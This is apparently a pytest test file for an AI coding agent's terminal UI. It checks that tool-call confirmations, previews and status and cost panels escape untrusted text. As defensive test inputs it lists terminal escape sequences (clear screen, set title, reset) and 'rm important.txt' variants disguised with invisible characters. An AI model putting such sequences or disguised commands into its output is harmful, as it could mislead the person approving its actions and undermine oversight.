    page = tmp_repo / "src" / "app" / "[id]" / "page.tsx"
    page.parent.mkdir(parents=True)
    page.write_text("export default 1\n")
    screen = Screen("n", width=300)
    call = edit_call("src/app/[id]/page.tsx", "1", "2")
    await screen.ui.confirm(call, write_request("Edit", str(page)), ASK)
    assert f"Edit  {page}" in screen.text
    assert "src/app/[id]/page.tsx" in screen.text


async def test_the_subject_line_of_a_confirmation_shows_every_control_by_name():
    # The whole output, on a console that is not a terminal, for a call that has no preview:
    # nothing else is printed that could hold the escapes in place of the subject line.
    command = "echo a\x1b[2K\rb\tc\x7f\x9bd"
    screen = Screen("n", width=200)
    call = ToolUseBlock("t1", "Bash", {"command": command})
    await screen.ui.confirm(call, PermissionRequest("Bash", command), ASK)
    assert screen.text == "\nBash  echo a\\x1b[2K\\rb\\tc\\x7f\\x9bd\n"


async def test_a_path_with_controls_in_it_is_named_on_the_subject_line_of_its_own_preview(tmp_repo):
    # A real file, so the preview works and the "no preview" line is not what is matched.
    target = tmp_repo / "a\x1b[2K\r.py"
    target.write_text("x = 1\n")
    screen = Screen("n", width=300)
    call = edit_call("a.py", "x = 1", "x = 2")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    lines = screen.text.splitlines()
    assert lines[1] == f"Edit  {tmp_repo}/a\\x1b[2K\\r.py"
    assert lines[2] == "  called with a.py"
    assert "no preview" not in screen.text and "-x = 1" in screen.text


async def test_a_confirmation_for_a_call_with_no_path_or_command_has_no_called_with_line():
    screen = Screen("n")
    call = ToolUseBlock("t1", "Odd", {"flag": True})
    await screen.ui.confirm(call, PermissionRequest("Odd", "something"), ASK)
    assert screen.text == "\nOdd  something\n"


async def test_the_models_own_spelling_is_shown_by_name_beside_the_path_it_resolved_to(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("n", width=300)
    call = edit_call("./a.py\r\x1b[2K", "x = 1", "x = 2")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    assert f"\nEdit  {target}\n  called with ./a.py\\r\\x1b[2K\n" in screen.text


async def test_the_reason_a_preview_is_not_possible_shows_its_controls_by_name(tmp_repo):
    # A file that is not there is reported with its name in repr form, which escapes it
    # already, so it would pass whatever was done to the text. A binary file is reported
    # with its name as it is.
    binary = tmp_repo / "bin\x1b[2K.dat"
    binary.write_bytes(b"\0\1\2")
    screen = Screen("n", width=300)
    call = edit_call("x.py", "a", "b")
    await screen.ui.confirm(call, write_request("Edit", str(binary)), ASK)
    [reason] = [ln for ln in screen.text.splitlines() if ln.startswith("  no preview: ")]
    assert f"{tmp_repo}/bin\\x1b[2K.dat looks binary" in reason


async def test_the_tool_name_is_shown_by_name_in_the_line_the_header_and_the_question():
    screen = Screen("n", width=200)
    name = "Ba\x1bsh"
    call = ToolUseBlock("t1", name, {"command": "make"})
    screen.ui.on_decision(call, PermissionRequest(name, "make"), ALLOW)
    await screen.ui.confirm(call, PermissionRequest(name, "make"), ASK)
    assert screen.text == "Ba\\x1bsh make\n\nBa\\x1bsh  make\n"
    assert "every Ba\\x1bsh call" in screen.prompter.asked[0]


async def test_two_subjects_that_differ_by_an_invisible_character_do_not_print_alike():
    subjects = [
        "rm important.txt",
        "rm important\N{ZERO WIDTH SPACE}.txt",
        "rm\N{WORD JOINER} important.txt",
        "rm important.txt\N{LEFT-TO-RIGHT MARK}",
    ]
    shown = []
    for subject in subjects:
        screen = Screen("n", width=200)
        call = ToolUseBlock("t1", "Bash", {"command": subject})
        await screen.ui.confirm(call, PermissionRequest("Bash", subject), ASK)
        shown.append(screen.text)
    assert len(set(shown)) == len(subjects)
    assert all(not any(unicodedata.category(c) == "Cf" for c in text) for text in shown)


async def test_an_edit_is_previewed_before_the_question_and_nothing_is_written(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    seen: dict[str, str] = {}
    screen = Screen("n")

    def at_the_question(_message: str) -> None:
        seen["screen"] = screen.text
        seen["file"] = target.read_text()

    screen.prompter.on_ask = at_the_question
    approval = await screen.ui.confirm(
        edit_call("a.py", "x = 1", "x = 2"), write_request("Edit", str(target)), ASK
    )
    assert approval is Approval.NO
    assert "-x = 1" in seen["screen"] and "+x = 2" in seen["screen"]
    assert seen["file"] == "x = 1\n"


def write_call(path: str, content: str) -> ToolUseBlock:
    return ToolUseBlock("w1", "Write", {"path": path, "content": content})


async def test_a_write_that_creates_a_file_shows_its_first_lines_and_its_size(tmp_repo):
    target = tmp_repo / "new.py"
    screen = Screen("n", width=300)
    call = write_call("new.py", "first\nsecond\nthird\n")
    await screen.ui.confirm(call, write_request("Write", str(target)), ASK)
    assert screen.text.splitlines()[3:] == [
        "  new file: 3 lines, 19 bytes",
        "    1  first",
        "    2  second",
        "    3  third",
    ]
    assert not target.exists()


async def test_a_long_new_file_is_cut_at_twenty_lines_and_says_how_many_more(tmp_repo):
    content = "".join(f"line {n}\n" for n in range(1, 26))
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("new.py", content), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    lines = screen.text.splitlines()[3:]
    assert lines[0] == "  new file: 25 lines, 191 bytes"
    assert lines[1] == "    1  line 1" and lines[20] == "   20  line 20"
    assert lines[21:] == ["  ... 5 more lines (showing the first 20)"]


async def test_a_line_of_a_new_file_wider_than_two_hundred_characters_is_cut(tmp_repo):
    screen = Screen("n", width=300)
    content = "x" * 200_000 + "\nnext\n"
    await screen.ui.confirm(
        write_call("new.py", content), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    assert screen.text.splitlines()[3:] == [
        "  new file: 2 lines, 200006 bytes",
        "    1  " + "x" * 200 + "... (199800 more characters)",
        "    2  next",
    ]


async def test_one_enormous_line_does_not_push_the_subject_line_off_the_screen(tmp_repo):
    # The cut at twenty lines bounds how many lines are listed and not how wide they are:
    # a single line of two hundred thousand characters was two thousand rows at this width.
    screen = Screen("n", width=100)
    await screen.ui.confirm(
        write_call("new.py", "x" * 200_000), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    rows = screen.text.splitlines()
    assert rows[1].startswith("Write  ") and len(rows) < 12


async def test_a_long_line_in_the_diff_of_a_replaced_file_is_cut_too(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("a.py", "y" * 5_000 + "\n"), write_request("Write", str(target)), ASK
    )
    assert screen.text.splitlines()[-1] == "+" + "y" * 199 + "... (4801 more characters)"


async def test_a_new_file_without_a_final_newline_says_so_after_its_last_line(tmp_repo):
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("new.py", "first\nlast"), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    assert screen.text.splitlines()[3:] == [
        "  new file: 2 lines, 10 bytes",
        "    1  first",
        "    2  last",
        "  \\ No newline at end of file",
    ]


async def test_an_empty_new_file_does_not_say_that_it_lacks_a_final_newline(tmp_repo):
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("new.py", ""), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    assert screen.text.splitlines()[3:] == ["  new file: 0 lines, 0 bytes"]


async def test_a_cut_listing_does_not_claim_to_know_how_the_file_ends(tmp_repo):
    # The end of the file is not shown, and the line that would carry the mark is not either.
    content = "".join(f"line {n}\n" for n in range(1, 26)) + "last"
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("new.py", content), write_request("Write", str(tmp_repo / "new.py")), ASK
    )
    assert "No newline" not in screen.text
    assert screen.text.splitlines()[-1] == "  ... 6 more lines (showing the first 20)"


async def test_a_write_that_replaces_a_file_shows_the_diff_before_the_question_and_writes_nothing(
    tmp_repo,
):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\ny = 2\n")
    seen: dict[str, str] = {}
    screen = Screen("n", width=300)

    def at_the_question(_message: str) -> None:
        seen["screen"] = screen.text
        seen["file"] = target.read_text()

    screen.prompter.on_ask = at_the_question
    await screen.ui.confirm(
        write_call("a.py", "x = 1\ny = 3\n"), write_request("Write", str(target)), ASK
    )
    assert seen["screen"].splitlines()[3:] == [
        "  replaces the file: 2 lines, 12 bytes after the write (+1 -1)",
        "--- a/a.py",
        "+++ b/a.py",
        "@@ -1,2 +1,2 @@",
        " x = 1",
        "-y = 2",
        "+y = 3",
    ]
    assert seen["file"] == "x = 1\ny = 2\n"


async def test_a_long_diff_is_cut_at_forty_lines_and_says_how_many_more(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("".join(f"old {n}\n" for n in range(100)))
    screen = Screen("n", width=300)
    content = "".join(f"new {n}\n" for n in range(100))
    await screen.ui.confirm(write_call("a.py", content), write_request("Write", str(target)), ASK)
    header = screen.text.splitlines()[3]
    assert header == "  replaces the file: 100 lines, 690 bytes after the write (+100 -100)"
    shown = screen.text.splitlines()[4:]  # past the blank line, the subject, called-with, header
    # 2 file header lines, 1 hunk header and 200 changed lines: 40 of the 203 are shown.
    assert shown[0] == "--- a/a.py" and len(shown) == 41
    assert shown[40] == "  ... 163 more lines (showing the first 40)"


async def test_a_write_that_changes_nothing_says_so(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("n", width=300)
    await screen.ui.confirm(write_call("a.py", "x = 1\n"), write_request("Write", str(target)), ASK)
    assert screen.text.splitlines()[3:] == [
        "  the file already holds this content: nothing will change"
    ]


async def test_a_write_over_a_file_that_cannot_be_compared_says_why_and_shows_what_it_writes(
    tmp_repo,
):
    binary = tmp_repo / "blob.bin"
    binary.write_bytes(b"\0\1\2")
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("blob.bin", "text\n"), write_request("Write", str(binary)), ASK
    )
    lines = screen.text.splitlines()[3:]
    assert lines == [
        f"  no diff: {binary} looks binary (NUL byte near the start)",
        "  will write: 1 line, 5 bytes",
        "    1  text",
    ]


async def test_the_reason_a_write_cannot_be_compared_shows_its_controls_by_name(tmp_repo):
    # A binary file is reported with its name as it is, so a name that holds an escape would
    # reach the terminal in the reason if the reason were printed as it came.
    binary = tmp_repo / "bin\x1b[2K.dat"
    binary.write_bytes(b"\0\1\2")
    screen = Screen("n", width=300)
    await screen.ui.confirm(write_call("x.dat", "text\n"), write_request("Write", str(binary)), ASK)
    [reason] = [line for line in screen.text.splitlines() if line.startswith("  no diff: ")]
    assert reason == f"  no diff: {tmp_repo}/bin\\x1b[2K.dat looks binary (NUL byte near the start)"


async def test_a_write_over_a_file_too_large_to_read_says_so_in_words_for_a_person(tmp_repo):
    # What the tool tells the model ends with advice for the model: Grep it, or slice it with
    # Bash. A person deciding about a write is not helped by it.
    big = tmp_repo / "big.txt"
    big.write_bytes(b"x" * 1_000_001)
    screen = Screen("n", width=300)
    await screen.ui.confirm(write_call("big.txt", "small\n"), write_request("Write", str(big)), ASK)
    reason = f"  no diff: {big} is 1000001 bytes, over the 1000000-byte read limit"
    assert reason in screen.text.splitlines()
    assert "Grep" not in screen.text and "slice" not in screen.text


async def test_an_edit_of_a_file_too_large_to_read_says_so_in_words_for_a_person(tmp_repo):
    big = tmp_repo / "big.txt"
    big.write_bytes(b"x" * 1_000_001)
    screen = Screen("n", width=300)
    await screen.ui.confirm(edit_call("big.txt", "x", "y"), write_request("Edit", str(big)), ASK)
    reason = f"  no preview: {big} is 1000001 bytes, over the 1000000-byte read limit"
    assert reason in screen.text.splitlines()
    assert "Grep" not in screen.text and "slice" not in screen.text


async def test_a_write_over_a_directory_says_why_it_cannot_be_compared(tmp_repo):
    folder = tmp_repo / "folder"
    folder.mkdir()
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("folder", "text\n"), write_request("Write", str(folder)), ASK
    )
    assert screen.text.splitlines()[3].startswith("  no diff: ")
    assert "Is a directory" in screen.text and "    1  text" in screen.text


@pytest.mark.parametrize("tool", ["Edit", "Write"])
def test_a_confirmation_for_a_fifo_says_it_cannot_be_previewed_and_does_not_wait(tool, tmp_repo):
    # The preview opens the file to read it, and a FIFO is not read until somebody writes to
    # it: the confirmation would print its header and then stand there, with no question.
    fifo = make_fifo(tmp_repo / "pipe.fifo")
    screen = Screen("n", width=300)
    call = write_call("pipe.fifo", "x\n") if tool == "Write" else edit_call("pipe.fifo", "a", "b")
    asked = screen.ui.confirm(call, write_request(tool, str(fifo)), ASK)
    assert call_without_blocking(fifo, asyncio.run, asked) is Approval.NO
    assert f"{fifo} is not a regular file" in screen.text


async def test_what_a_write_would_write_is_shown_with_its_controls_by_name(tmp_repo):
    screen = Screen("n", width=300)
    call = write_call("new.py", "a\x1b[2J\u200b\n")
    await screen.ui.confirm(call, write_request("Write", str(tmp_repo / "new.py")), ASK)
    assert "    1  a\\x1b[2J\\u200b" in screen.text.splitlines()


async def test_a_write_preview_sets_a_real_escape_apart_from_the_text_that_spells_one(tmp_repo):
    shown = {}
    for label, content in (("real", "x = '\x1b'\n"), ("spelled", "x = '\\x1b'\n")):
        console, buffer = terminal_console(300)
        ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
        await ui.confirm(
            write_call("n.py", content), write_request("Write", str(tmp_repo / "n.py")), ASK
        )
        shown[label] = buffer.getvalue()
    assert "7" in sgr_parameters(shown["real"])
    assert "7" not in sgr_parameters(shown["spelled"])


async def test_a_write_whose_content_cannot_be_written_is_said_not_to_be_previewable(tmp_repo):
    screen = Screen("n", width=300)
    call = ToolUseBlock("w1", "Write", {"path": "n.py"})
    await screen.ui.confirm(call, write_request("Write", str(tmp_repo / "n.py")), ASK)
    assert "  no preview: content must be a string, got NoneType" in screen.text


async def test_the_reason_a_write_cannot_be_previewed_shows_its_controls_by_name(
    tmp_repo, monkeypatch
):
    # Nothing the preview raises today holds a raw control, so the guard is pinned with a reason
    # that does: whatever a later change puts in the message, it is shown and not obeyed.
    def refuse(_path: str, _shown: str, _arguments: object) -> None:
        raise ToolArgumentError("content \x1b[2K is not text")

    monkeypatch.setattr(render, "preview_write", refuse)
    screen = Screen("n", width=300)
    await screen.ui.confirm(
        write_call("n.py", "x"), write_request("Write", str(tmp_repo / "n.py")), ASK
    )
    assert "  no preview: content \\x1b[2K is not text" in screen.text.splitlines()


async def test_a_write_whose_request_names_no_file_is_asked_about_without_a_preview():
    screen = Screen("y", width=300)
    approval = await screen.ui.confirm(
        write_call("n.py", "x"), PermissionRequest("Write", "n.py"), ASK
    )
    assert approval is Approval.ONCE and "new file" not in screen.text


async def test_an_edit_that_has_been_previewed_is_not_shown_again_when_it_is_applied(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("y")
    call = edit_call("a.py", "x = 1", "x = 2")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    before = screen.text
    screen.ui.on_outcome(call, ToolOutcome("e1", APPLIED))
    assert screen.text == before


async def test_an_edit_that_cannot_apply_is_said_not_to_be_previewable_and_why(tmp_repo):
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    screen = Screen("n")
    call = edit_call("a.py", "not in the file", "y")
    await screen.ui.confirm(call, write_request("Edit", str(target)), ASK)
    assert "no preview" in screen.text and "was not found" in screen.text


async def test_an_edit_whose_request_names_no_file_is_asked_about_without_a_preview():
    screen = Screen("y")
    call = edit_call("a.py", "x", "y")
    approval = await screen.ui.confirm(call, PermissionRequest("Edit", "a.py"), ASK)
    assert approval is Approval.ONCE
    assert screen.text == "\nEdit  a.py\n"


async def test_an_edit_of_a_file_that_is_not_there_is_said_not_to_be_previewable(tmp_repo):
    missing = tmp_repo / "missing.py"
    screen = Screen("n")
    await screen.ui.confirm(
        edit_call("missing.py", "x", "y"), write_request("Edit", str(missing)), ASK
    )
    assert "no preview" in screen.text


async def test_a_preview_shows_what_the_edit_would_write_with_its_controls_visible(tmp_repo):
    # The new text is the model's, and it is going into the file. Stripping the escape
    # sequence from the preview would show a person a cleaner edit than the one they approve.
    target = tmp_repo / "a.py"
    target.write_text("x = 1\n")
    console, buffer = terminal_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    call = edit_call("a.py", "x = 1", "x = '\x1b[2J'")
    await ui.confirm(call, write_request("Edit", str(target)), ASK)
    output = buffer.getvalue()
    # The escape is styled apart from the text around it, so the styling is read out first.
    assert r"\x1b[2J" in unstyled(output) and stray_escapes(output) == []


async def test_the_confirmation_prompt_is_not_built_until_something_is_asked(monkeypatch):
    built: list[int] = []

    def build() -> ScriptedPrompter:
        built.append(1)
        return ScriptedPrompter("n")

    monkeypatch.setattr(render, "new_prompter", build)
    console, _ = plain_console()
    ui = ConsoleUI(console)
    assert built == []
    await ui.confirm(
        ToolUseBlock("t1", "Bash", {"command": "make"}), PermissionRequest("Bash", "make"), ASK
    )
    assert built == [1]


# --------------------------------------------------------------------------
# Outside text is data: never markup, and never a command to the terminal
# --------------------------------------------------------------------------

Hook = Callable[[ConsoleUI, str], Awaitable[None]]


async def shows_a_reply(ui: ConsoleUI, text: str) -> None:
    ui.on_reply(reply(text))


async def shows_a_refusal(ui: ConsoleUI, text: str) -> None:
    result = PermissionResult(Decision.DENY, "rule.deny", text)
    ui.on_decision(
        ToolUseBlock("t1", "Read", {"path": "x"}), PermissionRequest("Read", "x"), result
    )


async def shows_an_allowed_call(ui: ConsoleUI, text: str) -> None:
    call = ToolUseBlock("t1", "Read", {"path": text})
    ui.on_decision(call, PermissionRequest("Read", text), ALLOW)


async def shows_a_failure(ui: ConsoleUI, text: str) -> None:
    ui.on_outcome(ToolUseBlock("t1", "Read", {"path": "x"}), ToolOutcome("t1", text, True))


async def shows_an_applied_edit(ui: ConsoleUI, text: str) -> None:
    applied = f"Edited a.py\n--- a/a.py\n+++ b/a.py\n@@ -1 +1 @@\n-x = 1\n+{text}\n"
    ui.on_outcome(edit_call("a.py", "x = 1", "x = 2"), ToolOutcome("e1", applied))


async def shows_a_task_list(ui: ConsoleUI, text: str) -> None:
    ui.on_outcome(ToolUseBlock("t1", "TodoWrite", {"todos": []}), ToolOutcome("t1", f"[x] {text}"))


async def shows_output(ui: ConsoleUI, text: str) -> None:
    ui.on_output(text)


async def shows_a_retry(ui: ConsoleUI, text: str) -> None:
    ui.on_retry(1, 2.0, text)


async def asks_to_confirm(ui: ConsoleUI, text: str) -> None:
    call = ToolUseBlock("t1", "Bash", {"command": text})
    await ui.confirm(call, PermissionRequest("Bash", text), ASK)


HOOKS: list[Hook] = [
    shows_a_reply,
    shows_a_refusal,
    shows_an_allowed_call,
    shows_a_failure,
    shows_an_applied_edit,
    shows_a_task_list,
    shows_output,
    shows_a_retry,
    asks_to_confirm,
]
HOOK_IDS = [hook.__name__ for hook in HOOKS]

#: Tags, an unmatched closing tag, a colour, a bracketed route segment and an emoji code.
MARKUP = "arr[0] [/] [bold]x[/bold] [#fff] src/app/[id] :warning:"

ESCAPES = [
    "\x1b[2J",  # clear the screen
    "\x1b]0;TITLE\x07",  # set the window title, BEL-terminated
    "\x1b]0;TITLE\x1b\\",  # the same, ST-terminated
    "\x9b2J",  # the 8-bit form of the first
    "\x1bc",  # reset the terminal
    "\x1b[2K\r",  # erase the line and return to its start
]


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_outside_text_is_data_and_never_markup(hook):
    screen = Screen("n")
    await hook(screen.ui, MARKUP)
    assert MARKUP in screen.text


@pytest.mark.parametrize("hostile", ESCAPES, ids=repr)
async def test_a_tool_name_holding_controls_cannot_act_on_the_terminal(hostile):
    # The name is the model's own text: it is in the collapsed line, the header and the
    # question, and the question goes to the prompt as a string.
    name = f"Ba{hostile}sh"
    console, buffer = terminal_console(200)
    prompter = ScriptedPrompter("n")
    ui = ConsoleUI(console, prompter=prompter)
    call = ToolUseBlock("t1", name, {"command": "make"})
    ui.on_decision(call, PermissionRequest(name, "make"), ALLOW)
    await ui.confirm(call, PermissionRequest(name, "make"), ASK)
    assert stray_escapes(buffer.getvalue()) == []
    [question] = prompter.asked
    assert stray_escapes(question) == []


@pytest.mark.parametrize("hostile", ESCAPES, ids=repr)
@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_no_outside_text_can_act_on_the_terminal(hook, hostile):
    console, buffer = terminal_console()
    ui = ConsoleUI(console, prompter=ScriptedPrompter("n"))
    await hook(ui, f"before {hostile} after")
    assert stray_escapes(buffer.getvalue()) == []
    assert "\r" not in buffer.getvalue()


async def test_a_tool_output_holding_a_closing_tag_prints_without_raising():
    # rich raises MarkupError for "[/]" with nothing to close.
    screen = Screen()
    ui = screen.ui
    call = ToolUseBlock("t1", "Bash", {"command": "make"})
    ui.on_outcome(call, ToolOutcome("t1", "build failed [/] see [/log]", is_error=True))
    assert screen.text == "  ! build failed [/] see [/log]\n"


def test_the_check_for_stray_escapes_sees_one_and_ignores_styling():
    assert stray_escapes("plain \x1b[1;31mred\x1b[0m") == []
    assert stray_escapes("a \x1b[2J b") == ["\x1b[2J b"]
    # An OSC sequence is its escape and its terminator, both of which a terminal acts on.
    assert stray_escapes("a \x1b]0;T\x07") == ["\x1b]0;T\x07", "\x07"]


@pytest.mark.parametrize(
    "control",
    ["\x9b", "\x9d", "\x90", "\x85", "\x9f", "\x7f", "\x07", "\x08", "\x00", "\r", "\x0b"],
    ids=lambda c: f"U+{ord(c):04X}",
)
def test_the_check_for_stray_escapes_flags_every_control_a_terminal_acts_on(control):
    # C1 is the 8-bit form of the escape sequences: U+009B is a CSI, U+009D an OSC. A check
    # that looks for ESC alone passes output that clears the screen with one character.
    assert stray_escapes(f"a{control}b") == [f"{control}b"]


def test_the_check_for_stray_escapes_leaves_text_alone():
    assert stray_escapes("a\tb\nc \N{NO-BREAK SPACE} caf\N{LATIN SMALL LETTER E WITH ACUTE}") == []


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_output_degrades_to_plain_text_when_not_a_terminal(hook):
    screen = Screen("n")
    await hook(screen.ui, "plain")
    assert screen.text != "" and "\x1b" not in screen.text


@pytest.mark.parametrize("hook", HOOKS, ids=HOOK_IDS)
async def test_no_colour_is_respected_on_a_terminal(hook, monkeypatch):
    monkeypatch.setenv("NO_COLOR", "1")
    console, buffer = terminal_console()
    await hook(ConsoleUI(console, prompter=ScriptedPrompter("n")), "plain")
    assert buffer.getvalue() != "" and colour_codes(buffer.getvalue()) == []


async def test_the_same_output_is_coloured_on_a_terminal_that_allows_it(monkeypatch):
    # The counterpart of the test above, so that a checker that reports nothing for
    # everything cannot pass it: the refusal really is red when colour is allowed.
    monkeypatch.delenv("NO_COLOR", raising=False)
    console, buffer = terminal_console()
    await shows_a_refusal(ConsoleUI(console), "outside the sandbox")
    assert "31" in colour_codes(buffer.getvalue())


# --------------------------------------------------------------------------
# /status
# --------------------------------------------------------------------------


def test_status_names_each_role_with_its_model_and_alias(tmp_repo):
    session = build_session(tmp_repo, [], compact_script=[])
    text = capture(status_panel(session, 0, 1_000))
    assert "claude-sonnet-5 (m)" in row(text, "main")
    assert "claude-sonnet-5 (m)" in row(text, "explore")
    assert "claude-haiku-4-5 (c)" in row(text, "compact")


def test_status_shows_the_mode_the_sandbox_the_session_and_the_tools(tmp_repo):
    session = build_session(tmp_repo, [])
    text = capture(status_panel(session, 0, 1_000), width=200)
    assert "default" in row(text, "mode")
    assert session.policy.sandbox.roots[0] in row(text, "sandbox")
    assert session.session_id in row(text, "session")
    assert str(len(session.registry)) in row(text, "tools")
    assert "0/40" in row(text, "turns")


@pytest.mark.parametrize(
    ("used", "available", "bar"),
    [
        (0, 10_000, "[" + "." * 20 + "]"),
        (5_000, 10_000, "[" + "#" * 10 + "." * 10 + "]"),
        (9_999, 10_000, "[" + "#" * 19 + "." + "]"),
        (20_000, 10_000, "[" + "#" * 20 + "]"),
        (500, 0, "[" + "." * 20 + "]"),
    ],
)
def test_the_context_bar_fills_in_proportion_and_survives_the_brackets_around_it(
    tmp_repo, used, available, bar
):
    # "[####....]" is a style tag to rich, and was printed as nothing at all once any
    # of it was filled.
    session = build_session(tmp_repo, [])
    line = row(capture(status_panel(session, used, available)), "context")
    assert bar in line and f"{used}/{available} tokens" in line


def test_a_sandbox_root_with_brackets_is_shown_as_it_is(tmp_repo):
    root = tmp_repo / "[id]"
    root.mkdir()
    session = build_session(root, [])
    assert "[id]" in row(capture(status_panel(session, 0, 1_000), width=300), "sandbox")


def test_a_narrow_terminal_gets_a_narrower_table(tmp_repo):
    session = build_session(tmp_repo, [])
    lines = capture(status_panel(session, 100, 1_000), width=40).splitlines()
    assert max(len(line) for line in lines) <= 40
    assert session.session_id in "".join(line.strip(" │") for line in lines)


# --------------------------------------------------------------------------
# /cost
# --------------------------------------------------------------------------


def router_with(prices: PriceBook, tmp_path: Path) -> Router:
    models = {
        "priced": ModelConfig("anthropic", "claude-sonnet-5"),
        "unpriced": ModelConfig("openai_compat", "mystery", base_url="https://x/v1"),
    }
    config = Config(models=models, roles=RolesConfig(*["priced"] * 6))
    return Router(config, CapabilityCache(tmp_path / "caps.json"), prices=prices)


def book(updated: date) -> PriceBook:
    return PriceBook({("anthropic", "claude-sonnet-5"): Price(3.0, 15.0)}, updated)


def test_cost_is_shown_per_role_and_in_total(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    router.record("main", Usage(1_000_000, 100_000, 5), "anthropic", "claude-sonnet-5")
    text = capture(cost_panel(router, router.prices))
    assert re.search(r"main\W+claude-sonnet-5\W+1000000\W+100000\W+5\W+\$4\.5000", text)
    # The same figure again on the total row, which has no label.
    assert text.count("$4.5000") == 2


def test_a_model_with_no_price_costs_a_dash_and_makes_the_total_a_dash(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    router.record("main", Usage(1_000_000), "anthropic", "claude-sonnet-5")
    router.record("explore", Usage(10), "openai_compat", "mystery")
    text = capture(cost_panel(router, router.prices))
    assert re.search(r"mystery\W+10\W+0\W+0\W+-\W*$", row(text, "explore"))
    assert "$0.00" not in text
    # The priced role's cost stands, and the total, which would be a guess, is not given:
    # it is the row after the last role, and it is a dash.
    assert "$3.0000" in row(text, "main")
    lines = text.splitlines()
    total = lines[lines.index(row(text, "explore")) + 1]
    assert "$" not in total and re.search(r"-\W*$", total)


def test_the_cost_table_says_it_covers_this_run_only(tmp_path):
    # After a resume the stored row holds the running total and the router holds only
    # what this run spent; the title says which one this is.
    router = router_with(book(date.today()), tmp_path)
    assert "this run" in capture(cost_panel(router, router.prices))


def test_an_old_price_table_is_flagged(tmp_path):
    old = date.today() - timedelta(days=200)
    router = router_with(book(old), tmp_path)
    text = capture(cost_panel(router, router.prices))
    assert str(old) in text and "out of date" in text


def test_a_current_price_table_is_not(tmp_path):
    router = router_with(book(date.today()), tmp_path)
    assert "out of date" not in capture(cost_panel(router, router.prices))


def test_a_narrow_terminal_gets_a_narrower_cost_table_and_the_names_give_way_not_the_numbers(
    tmp_path,
):
    router = router_with(book(date.today() - timedelta(days=200)), tmp_path)
    router.record("main", Usage(1_000_000, 100_000, 5), "anthropic", "claude-sonnet-5")
    text = capture(cost_panel(router, router.prices), width=50)
    assert max(len(line) for line in text.splitlines()) <= 50
    assert re.search(r"1000000\W+100000\W+5\W+\$4\.5000", row(text, "main"))


# --------------------------------------------------------------------------
# The UI protocol
# --------------------------------------------------------------------------

_conforms: UI = ConsoleUI(Console())


def test_the_console_ui_is_a_ui():
    assert isinstance(_conforms, UI)
